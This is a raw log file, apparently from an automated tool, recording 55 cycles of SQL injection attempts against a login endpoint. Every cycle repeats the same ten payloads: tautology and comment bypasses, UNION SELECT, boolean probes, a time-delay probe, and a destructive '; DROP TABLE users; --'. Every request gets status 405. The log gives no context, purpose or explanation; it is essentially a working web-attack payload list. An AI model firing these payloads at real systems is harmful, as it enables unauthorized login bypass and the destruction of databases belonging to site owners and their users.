2026-04-19 16:36:41 | SQLI_BYPASS | cycle=1 | query=' OR '1'='1 | status=405
2026-04-19 16:37:36 | SQLI_BYPASS | cycle=28 | query=admin' -- | status=405
2026-04-19 16:37:36 | SQLI_BYPASS | cycle=28 | query=admin' # | status=405
2026-04-19 16:37:36 | SQLI_BYPASS | cycle=28 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:37 | SQLI_BYPASS | cycle=28 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:37 | SQLI_BYPASS | cycle=28 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:37 | SQLI_BYPASS | cycle=28 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:37 | SQLI_BYPASS | cycle=28 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:37 | SQLI_BYPASS | cycle=28 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:38 | SQLI_BYPASS | cycle=28 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:38 | SQLI_BYPASS | cycle=29 | query=' OR '1'='1 | status=405
2026-04-19 16:37:38 | SQLI_BYPASS | cycle=29 | query=admin' -- | status=405
2026-04-19 16:37:38 | SQLI_BYPASS | cycle=29 | query=admin' # | status=405
2026-04-19 16:37:38 | SQLI_BYPASS | cycle=29 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:39 | SQLI_BYPASS | cycle=29 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:39 | SQLI_BYPASS | cycle=29 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:39 | SQLI_BYPASS | cycle=29 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:39 | SQLI_BYPASS | cycle=29 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:39 | SQLI_BYPASS | cycle=29 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:40 | SQLI_BYPASS | cycle=29 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:40 | SQLI_BYPASS | cycle=30 | query=' OR '1'='1 | status=405
2026-04-19 16:37:40 | SQLI_BYPASS | cycle=30 | query=admin' -- | status=405
2026-04-19 16:37:40 | SQLI_BYPASS | cycle=30 | query=admin' # | status=405
2026-04-19 16:37:40 | SQLI_BYPASS | cycle=30 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:41 | SQLI_BYPASS | cycle=30 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:41 | SQLI_BYPASS | cycle=30 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:41 | SQLI_BYPASS | cycle=30 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:41 | SQLI_BYPASS | cycle=30 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:41 | SQLI_BYPASS | cycle=30 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:42 | SQLI_BYPASS | cycle=30 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:42 | SQLI_BYPASS | cycle=31 | query=' OR '1'='1 | status=405
2026-04-19 16:37:42 | SQLI_BYPASS | cycle=31 | query=admin' -- | status=405
2026-04-19 16:37:42 | SQLI_BYPASS | cycle=31 | query=admin' # | status=405
2026-04-19 16:37:43 | SQLI_BYPASS | cycle=31 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:43 | SQLI_BYPASS | cycle=31 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:43 | SQLI_BYPASS | cycle=31 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:43 | SQLI_BYPASS | cycle=31 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:43 | SQLI_BYPASS | cycle=31 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:43 | SQLI_BYPASS | cycle=31 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:44 | SQLI_BYPASS | cycle=31 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:44 | SQLI_BYPASS | cycle=32 | query=' OR '1'='1 | status=405
2026-04-19 16:37:44 | SQLI_BYPASS | cycle=32 | query=admin' -- | status=405
2026-04-19 16:37:44 | SQLI_BYPASS | cycle=32 | query=admin' # | status=405
2026-04-19 16:37:44 | SQLI_BYPASS | cycle=32 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:45 | SQLI_BYPASS | cycle=32 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:45 | SQLI_BYPASS | cycle=32 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:45 | SQLI_BYPASS | cycle=32 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:45 | SQLI_BYPASS | cycle=32 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:46 | SQLI_BYPASS | cycle=32 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:46 | SQLI_BYPASS | cycle=32 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:46 | SQLI_BYPASS | cycle=33 | query=' OR '1'='1 | status=405
2026-04-19 16:37:46 | SQLI_BYPASS | cycle=33 | query=admin' -- | status=405
2026-04-19 16:37:46 | SQLI_BYPASS | cycle=33 | query=admin' # | status=405
2026-04-19 16:37:47 | SQLI_BYPASS | cycle=33 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:47 | SQLI_BYPASS | cycle=33 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:47 | SQLI_BYPASS | cycle=33 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:47 | SQLI_BYPASS | cycle=33 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:47 | SQLI_BYPASS | cycle=33 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:47 | SQLI_BYPASS | cycle=33 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:48 | SQLI_BYPASS | cycle=33 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:48 | SQLI_BYPASS | cycle=34 | query=' OR '1'='1 | status=405
2026-04-19 16:37:48 | SQLI_BYPASS | cycle=34 | query=admin' -- | status=405
2026-04-19 16:37:49 | SQLI_BYPASS | cycle=34 | query=admin' # | status=405
2026-04-19 16:37:49 | SQLI_BYPASS | cycle=34 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:49 | SQLI_BYPASS | cycle=34 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:49 | SQLI_BYPASS | cycle=34 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:49 | SQLI_BYPASS | cycle=34 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:50 | SQLI_BYPASS | cycle=34 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:50 | SQLI_BYPASS | cycle=34 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:50 | SQLI_BYPASS | cycle=34 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:50 | SQLI_BYPASS | cycle=35 | query=' OR '1'='1 | status=405
2026-04-19 16:37:50 | SQLI_BYPASS | cycle=35 | query=admin' -- | status=405
2026-04-19 16:37:51 | SQLI_BYPASS | cycle=35 | query=admin' # | status=405
2026-04-19 16:37:51 | SQLI_BYPASS | cycle=35 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:51 | SQLI_BYPASS | cycle=35 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:51 | SQLI_BYPASS | cycle=35 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:51 | SQLI_BYPASS | cycle=35 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:52 | SQLI_BYPASS | cycle=35 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:52 | SQLI_BYPASS | cycle=35 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:52 | SQLI_BYPASS | cycle=35 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:52 | SQLI_BYPASS | cycle=36 | query=' OR '1'='1 | status=405
2026-04-19 16:37:52 | SQLI_BYPASS | cycle=36 | query=admin' -- | status=405
2026-04-19 16:37:53 | SQLI_BYPASS | cycle=36 | query=admin' # | status=405
2026-04-19 16:37:53 | SQLI_BYPASS | cycle=36 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:53 | SQLI_BYPASS | cycle=36 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:53 | SQLI_BYPASS | cycle=36 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:53 | SQLI_BYPASS | cycle=36 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:54 | SQLI_BYPASS | cycle=36 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:54 | SQLI_BYPASS | cycle=36 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:54 | SQLI_BYPASS | cycle=36 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:54 | SQLI_BYPASS | cycle=37 | query=' OR '1'='1 | status=405
2026-04-19 16:37:54 | SQLI_BYPASS | cycle=37 | query=admin' -- | status=405
2026-04-19 16:37:54 | SQLI_BYPASS | cycle=37 | query=admin' # | status=405
2026-04-19 16:37:55 | SQLI_BYPASS | cycle=37 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:55 | SQLI_BYPASS | cycle=37 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:55 | SQLI_BYPASS | cycle=37 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:55 | SQLI_BYPASS | cycle=37 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:55 | SQLI_BYPASS | cycle=37 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:56 | SQLI_BYPASS | cycle=37 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:56 | SQLI_BYPASS | cycle=37 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:56 | SQLI_BYPASS | cycle=38 | query=' OR '1'='1 | status=405
2026-04-19 16:37:56 | SQLI_BYPASS | cycle=38 | query=admin' -- | status=405
2026-04-19 16:37:56 | SQLI_BYPASS | cycle=38 | query=admin' # | status=405
2026-04-19 16:37:57 | SQLI_BYPASS | cycle=38 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:57 | SQLI_BYPASS | cycle=38 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:57 | SQLI_BYPASS | cycle=38 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:57 | SQLI_BYPASS | cycle=38 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:57 | SQLI_BYPASS | cycle=38 | query=admin' OR 'a'='a | status=405
2026-04-19 16:37:58 | SQLI_BYPASS | cycle=38 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:37:58 | SQLI_BYPASS | cycle=38 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:37:58 | SQLI_BYPASS | cycle=39 | query=' OR '1'='1 | status=405
2026-04-19 16:37:58 | SQLI_BYPASS | cycle=39 | query=admin' -- | status=405
2026-04-19 16:37:58 | SQLI_BYPASS | cycle=39 | query=admin' # | status=405
2026-04-19 16:37:58 | SQLI_BYPASS | cycle=39 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:37:59 | SQLI_BYPASS | cycle=39 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:37:59 | SQLI_BYPASS | cycle=39 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:37:59 | SQLI_BYPASS | cycle=39 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:37:59 | SQLI_BYPASS | cycle=39 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:00 | SQLI_BYPASS | cycle=39 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:00 | SQLI_BYPASS | cycle=39 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:00 | SQLI_BYPASS | cycle=40 | query=' OR '1'='1 | status=405
2026-04-19 16:38:00 | SQLI_BYPASS | cycle=40 | query=admin' -- | status=405
2026-04-19 16:38:00 | SQLI_BYPASS | cycle=40 | query=admin' # | status=405
2026-04-19 16:38:01 | SQLI_BYPASS | cycle=40 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:01 | SQLI_BYPASS | cycle=40 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:01 | SQLI_BYPASS | cycle=40 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:01 | SQLI_BYPASS | cycle=40 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:01 | SQLI_BYPASS | cycle=40 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:02 | SQLI_BYPASS | cycle=40 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:02 | SQLI_BYPASS | cycle=40 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:02 | SQLI_BYPASS | cycle=41 | query=' OR '1'='1 | status=405
2026-04-19 16:38:02 | SQLI_BYPASS | cycle=41 | query=admin' -- | status=405
2026-04-19 16:38:03 | SQLI_BYPASS | cycle=41 | query=admin' # | status=405
2026-04-19 16:38:03 | SQLI_BYPASS | cycle=41 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:03 | SQLI_BYPASS | cycle=41 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:03 | SQLI_BYPASS | cycle=41 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:03 | SQLI_BYPASS | cycle=41 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:04 | SQLI_BYPASS | cycle=41 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:04 | SQLI_BYPASS | cycle=41 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:04 | SQLI_BYPASS | cycle=41 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:04 | SQLI_BYPASS | cycle=42 | query=' OR '1'='1 | status=405
2026-04-19 16:38:05 | SQLI_BYPASS | cycle=42 | query=admin' -- | status=405
2026-04-19 16:38:05 | SQLI_BYPASS | cycle=42 | query=admin' # | status=405
2026-04-19 16:38:05 | SQLI_BYPASS | cycle=42 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:05 | SQLI_BYPASS | cycle=42 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:05 | SQLI_BYPASS | cycle=42 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:05 | SQLI_BYPASS | cycle=42 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:06 | SQLI_BYPASS | cycle=42 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:06 | SQLI_BYPASS | cycle=42 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:06 | SQLI_BYPASS | cycle=42 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:06 | SQLI_BYPASS | cycle=43 | query=' OR '1'='1 | status=405
2026-04-19 16:38:06 | SQLI_BYPASS | cycle=43 | query=admin' -- | status=405
2026-04-19 16:38:06 | SQLI_BYPASS | cycle=43 | query=admin' # | status=405
2026-04-19 16:38:07 | SQLI_BYPASS | cycle=43 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:07 | SQLI_BYPASS | cycle=43 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:07 | SQLI_BYPASS | cycle=43 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:07 | SQLI_BYPASS | cycle=43 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:07 | SQLI_BYPASS | cycle=43 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:08 | SQLI_BYPASS | cycle=43 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:08 | SQLI_BYPASS | cycle=43 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:08 | SQLI_BYPASS | cycle=44 | query=' OR '1'='1 | status=405
2026-04-19 16:38:08 | SQLI_BYPASS | cycle=44 | query=admin' -- | status=405
2026-04-19 16:38:08 | SQLI_BYPASS | cycle=44 | query=admin' # | status=405
2026-04-19 16:38:08 | SQLI_BYPASS | cycle=44 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:09 | SQLI_BYPASS | cycle=44 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:09 | SQLI_BYPASS | cycle=44 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:09 | SQLI_BYPASS | cycle=44 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:09 | SQLI_BYPASS | cycle=44 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:09 | SQLI_BYPASS | cycle=44 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:10 | SQLI_BYPASS | cycle=44 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:10 | SQLI_BYPASS | cycle=45 | query=' OR '1'='1 | status=405
2026-04-19 16:38:10 | SQLI_BYPASS | cycle=45 | query=admin' -- | status=405
2026-04-19 16:38:10 | SQLI_BYPASS | cycle=45 | query=admin' # | status=405
2026-04-19 16:38:11 | SQLI_BYPASS | cycle=45 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:11 | SQLI_BYPASS | cycle=45 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:11 | SQLI_BYPASS | cycle=45 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:11 | SQLI_BYPASS | cycle=45 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:11 | SQLI_BYPASS | cycle=45 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:12 | SQLI_BYPASS | cycle=45 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:12 | SQLI_BYPASS | cycle=45 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:12 | SQLI_BYPASS | cycle=46 | query=' OR '1'='1 | status=405
2026-04-19 16:38:12 | SQLI_BYPASS | cycle=46 | query=admin' -- | status=405
2026-04-19 16:38:12 | SQLI_BYPASS | cycle=46 | query=admin' # | status=405
2026-04-19 16:38:12 | SQLI_BYPASS | cycle=46 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:13 | SQLI_BYPASS | cycle=46 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:13 | SQLI_BYPASS | cycle=46 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:13 | SQLI_BYPASS | cycle=46 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:13 | SQLI_BYPASS | cycle=46 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:13 | SQLI_BYPASS | cycle=46 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:14 | SQLI_BYPASS | cycle=46 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:14 | SQLI_BYPASS | cycle=47 | query=' OR '1'='1 | status=405
2026-04-19 16:38:14 | SQLI_BYPASS | cycle=47 | query=admin' -- | status=405
2026-04-19 16:38:14 | SQLI_BYPASS | cycle=47 | query=admin' # | status=405
2026-04-19 16:38:15 | SQLI_BYPASS | cycle=47 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:15 | SQLI_BYPASS | cycle=47 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:15 | SQLI_BYPASS | cycle=47 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:15 | SQLI_BYPASS | cycle=47 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:16 | SQLI_BYPASS | cycle=47 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:16 | SQLI_BYPASS | cycle=47 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:16 | SQLI_BYPASS | cycle=47 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:16 | SQLI_BYPASS | cycle=48 | query=' OR '1'='1 | status=405
2026-04-19 16:38:16 | SQLI_BYPASS | cycle=48 | query=admin' -- | status=405
2026-04-19 16:38:17 | SQLI_BYPASS | cycle=48 | query=admin' # | status=405
2026-04-19 16:38:17 | SQLI_BYPASS | cycle=48 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:17 | SQLI_BYPASS | cycle=48 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:17 | SQLI_BYPASS | cycle=48 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:17 | SQLI_BYPASS | cycle=48 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:18 | SQLI_BYPASS | cycle=48 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:18 | SQLI_BYPASS | cycle=48 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:18 | SQLI_BYPASS | cycle=48 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:18 | SQLI_BYPASS | cycle=49 | query=' OR '1'='1 | status=405
2026-04-19 16:38:19 | SQLI_BYPASS | cycle=49 | query=admin' -- | status=405
2026-04-19 16:38:19 | SQLI_BYPASS | cycle=49 | query=admin' # | status=405
2026-04-19 16:38:19 | SQLI_BYPASS | cycle=49 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:19 | SQLI_BYPASS | cycle=49 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:19 | SQLI_BYPASS | cycle=49 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:20 | SQLI_BYPASS | cycle=49 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:20 | SQLI_BYPASS | cycle=49 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:20 | SQLI_BYPASS | cycle=49 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:20 | SQLI_BYPASS | cycle=49 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:20 | SQLI_BYPASS | cycle=50 | query=' OR '1'='1 | status=405
2026-04-19 16:38:21 | SQLI_BYPASS | cycle=50 | query=admin' -- | status=405
2026-04-19 16:38:21 | SQLI_BYPASS | cycle=50 | query=admin' # | status=405
2026-04-19 16:38:21 | SQLI_BYPASS | cycle=50 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:21 | SQLI_BYPASS | cycle=50 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:21 | SQLI_BYPASS | cycle=50 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:22 | SQLI_BYPASS | cycle=50 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:22 | SQLI_BYPASS | cycle=50 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:22 | SQLI_BYPASS | cycle=50 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:22 | SQLI_BYPASS | cycle=50 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:22 | SQLI_BYPASS | cycle=51 | query=' OR '1'='1 | status=405
2026-04-19 16:38:23 | SQLI_BYPASS | cycle=51 | query=admin' -- | status=405
2026-04-19 16:38:23 | SQLI_BYPASS | cycle=51 | query=admin' # | status=405
2026-04-19 16:38:23 | SQLI_BYPASS | cycle=51 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:23 | SQLI_BYPASS | cycle=51 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:23 | SQLI_BYPASS | cycle=51 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:24 | SQLI_BYPASS | cycle=51 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:24 | SQLI_BYPASS | cycle=51 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:24 | SQLI_BYPASS | cycle=51 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:24 | SQLI_BYPASS | cycle=51 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:24 | SQLI_BYPASS | cycle=52 | query=' OR '1'='1 | status=405
2026-04-19 16:38:25 | SQLI_BYPASS | cycle=52 | query=admin' -- | status=405
2026-04-19 16:38:25 | SQLI_BYPASS | cycle=52 | query=admin' # | status=405
2026-04-19 16:38:25 | SQLI_BYPASS | cycle=52 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:25 | SQLI_BYPASS | cycle=52 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:26 | SQLI_BYPASS | cycle=52 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:26 | SQLI_BYPASS | cycle=52 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:26 | SQLI_BYPASS | cycle=52 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:26 | SQLI_BYPASS | cycle=52 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:26 | SQLI_BYPASS | cycle=52 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:27 | SQLI_BYPASS | cycle=53 | query=' OR '1'='1 | status=405
2026-04-19 16:38:27 | SQLI_BYPASS | cycle=53 | query=admin' -- | status=405
2026-04-19 16:38:27 | SQLI_BYPASS | cycle=53 | query=admin' # | status=405
2026-04-19 16:38:27 | SQLI_BYPASS | cycle=53 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:27 | SQLI_BYPASS | cycle=53 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:28 | SQLI_BYPASS | cycle=53 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:28 | SQLI_BYPASS | cycle=53 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:28 | SQLI_BYPASS | cycle=53 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:28 | SQLI_BYPASS | cycle=53 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:28 | SQLI_BYPASS | cycle=53 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:29 | SQLI_BYPASS | cycle=54 | query=' OR '1'='1 | status=405
2026-04-19 16:38:29 | SQLI_BYPASS | cycle=54 | query=admin' -- | status=405
2026-04-19 16:38:29 | SQLI_BYPASS | cycle=54 | query=admin' # | status=405
2026-04-19 16:38:29 | SQLI_BYPASS | cycle=54 | query=' UNION SELECT 1, 'admin', '123' -- | status=405
2026-04-19 16:38:29 | SQLI_BYPASS | cycle=54 | query=admin' AND 1=1 -- | status=405
2026-04-19 16:38:30 | SQLI_BYPASS | cycle=54 | query=admin' AND 1=2 -- | status=405
2026-04-19 16:38:30 | SQLI_BYPASS | cycle=54 | query='; WAITFOR DELAY '0:0:5' -- | status=405
2026-04-19 16:38:30 | SQLI_BYPASS | cycle=54 | query=admin' OR 'a'='a | status=405
2026-04-19 16:38:30 | SQLI_BYPASS | cycle=54 | query='; DROP TABLE users; -- | status=405
2026-04-19 16:38:30 | SQLI_BYPASS | cycle=54 | query=admin' AND (SELECT 1)=1 -- | status=405
2026-04-19 16:38:31 | SQLI_BYPASS | cycle=55 | query=' OR '1'='1 | status=405
2026-04-19 16:38:31 | SQLI_BYPASS | cycle=55 | query=admin' -- | status=405
